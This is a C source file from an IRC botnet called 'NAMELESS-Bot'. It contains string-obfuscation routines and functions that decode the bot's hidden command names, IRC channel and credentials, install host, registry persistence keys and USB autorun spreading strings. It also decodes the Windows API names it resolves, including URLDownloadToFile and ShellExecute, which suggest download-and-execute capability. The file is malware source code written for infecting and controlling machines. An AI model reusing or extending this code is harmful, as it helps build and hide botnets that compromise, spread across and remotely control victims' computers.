/*
            [ N A M E L E S S - Bot ]
            [       by: Carve       ]

            Thanks To; The Rogue & t0nix
*/

#include <stdio.h>
#include <string.h>
#include "global.h"


/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

/* for most static strings */
char *Encode_Decode(unsigned char *string)
{
    unsigned int i, j;

    for (i = 0; i < strlen(string); i++)
    {
        for (j = 0; j < strlen(decode_ps); j++)
            string[i] ^= decode_ps[j];

        string[i] = ~ string[i];
    }

    return string;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

char *strCryptDecrypt (char *InputString, char *psword , int Method) /* CryptDecrypt(input,ps,1/0) 0=decrypt 1=encrypt */
{
    long LengOfString = strlen (InputString);
    long LengOfps = strlen (psword);
    long PossitionOfps = 0;

    char * buffer = {0};
    /*buffer = new char[LengOfString + 1];*/
    buffer = malloc(LengOfString +1);
    buffer[LengOfString] = 0;

    long i = 0;
    for (i; i < LengOfString; i++)
    {
        if (PossitionOfps >= LengOfps)
        {
            PossitionOfps = 0;
        }
        else
        {
            PossitionOfps++;
        }


        if (Method == 1)
        {
            buffer[i] = InputString[i] + psword[PossitionOfps];
        }
        else
        {
            buffer[i] = InputString[i] - psword[PossitionOfps];
        }
    }
    return buffer;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

/* not really encryption, but keeps "stupid" people from knowing your cmds */
char* Reverse_Str(char* str)
{
    char *temp, *ptr;
    int len, i;

    temp=str;
    for (len=0; *temp !='\0';temp++, len++);

    ptr=malloc(sizeof(char)*(len+1));

    for (i=len-1; i>=0; i--)
        ptr[len-i-1]=str[i];

    ptr[len]='\0';
    return ptr;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

void decode_things(void)
{
    /* CMDS */
    Encode_Decode(cmd__rcl);
    Encode_Decode(cmd__rmme);

    /* IRC */
    Encode_Decode(my_nk);
    Encode_Decode(my_usr);
    Encode_Decode(my_s4y);
    Encode_Decode(my_ntc);
    Encode_Decode(my_ps);
    Encode_Decode(my_jn);
    Encode_Decode(my_pt);
    Encode_Decode(my_qt);
    Encode_Decode(my_P1N6);
    Encode_Decode(my_P0N6);
    Encode_Decode(my_4_4_3);
    Encode_Decode(my_3_3_2);
    ////////////////////////////////added
    Encode_Decode(chan);
    Encode_Decode(chanps);
    Encode_Decode(authost);
    Encode_Decode(rcmsg);
    Encode_Decode(exename);
    Encode_Decode(regkey);
    Encode_Decode(regname);
    Encode_Decode(open);
    Encode_Decode(key13);
    Encode_Decode(NewInstall_Host);
    Encode_Decode(my_usragent);
    Encode_Decode(qtmsg);
    Encode_Decode(rdpcmd);
    ////////////////////////////
    ////////////////////////////
    ////////    usb ////////////
    ////////////////////////////
    ////////////////////////////
    Encode_Decode(USB_STR_RECYCLER);
    Encode_Decode(USB_STR_REC_SUBDIR);
    Encode_Decode(USB_STR_DESKTOP_INI);
    Encode_Decode(USB_STR_AUTORUN_INF);
    Encode_Decode(USB_STR_AUTORUN_DATA1);
    Encode_Decode(USB_STR_AUTORUN_DATA2);
    Encode_Decode(USB_STR_AUTORUN_DATA3);
    Encode_Decode(USB_STR_FILENAME);
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

void decode_apis(void)
{

    /* Shell32.dll */
    Reverse_Str(shell32_);
    Reverse_Str(ShellExecute_);

    /* AdvApi32.dll */
    Reverse_Str(advapi32_);
    Reverse_Str(RegCreateKeyEx_);
    Reverse_Str(RegSetValueEx_);
    Reverse_Str(RegCloseKey_);

    /* WS2_32.dll */
    Reverse_Str(WS2_32_);
    Reverse_Str(WSACleanup_);
    Reverse_Str(WSAStartup_);
    Reverse_Str(closesocket_);
    Reverse_Str(connect_);
    Reverse_Str(gethostbyname_);
    Reverse_Str(htons_);
    Reverse_Str(recv_);
    Reverse_Str(send_);
    Reverse_Str(socket_);

    /* urlmon.dll */
    Reverse_Str(urlmon_);
    Reverse_Str(URLDownloadToFile_);
}
